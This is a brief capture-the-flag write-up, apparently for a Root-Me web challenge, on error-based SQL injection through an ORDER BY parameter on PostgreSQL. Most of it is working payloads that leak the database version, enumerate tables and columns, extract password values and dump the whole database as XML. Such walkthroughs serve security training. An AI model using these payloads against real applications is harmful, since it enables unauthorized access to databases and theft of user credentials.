Vulnerable enpoint: `GET /web-serveur/ch34/?action=contents&order=`

First, I need to find a way to escape the query. Imagine the query like this:
```
SELECT * FROM contents ORDER BY page ASC;
```
To escapse I could add a `,` before my payload. And with the description I tried every databases error payload and success to find that it was PostgreSQL
```
,CAST(chr(126)||VERSION()||chr(126)+AS+NUMERIC)
```
The above payload return `ERROR:  invalid input syntax for type numeric: "~PostgreSQL 9.5.25 on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 5.4.0-6ubuntu1~16.04.12) 5.4.0 20160609, 64-bit~"`

To find table name, I use this payload:
```
,CAST(chr(126)||(SELECT+table_name+FROM+information_schema.tables+LIMIT+1+offset+0)||chr(126)+AS+NUMERIC)--
```

Changing the data_offset give me some tables:`m3mbr35t4bl3`, `contents`,... Then I could use the following payload to get the collumns name
```
,CAST(chr(126)||(SELECT+column_name+FROM+information_schema.columns+LIMIT+1+OFFSET+1)||chr(126)+AS+NUMERIC)--
```
I dumped some collums: `us3rn4m3_c0l`, `p455w0rd_c0l`, `em41l_c0l`,...

To get the content of the table, I used this payload
```
CAST(chr(126)||(SELECT p455w0rd_c0l FROM m3mbr35t4bl3 LIMIT 1 offset 0)||chr(126) AS NUMERIC)
```
Returned error is the result for this challenge

Another payload
```
, (SELECT CAST(CHR(32)||(SELECT database_to_xml(TRUE,TRUE,'')) AS NUMERIC)) ASC
```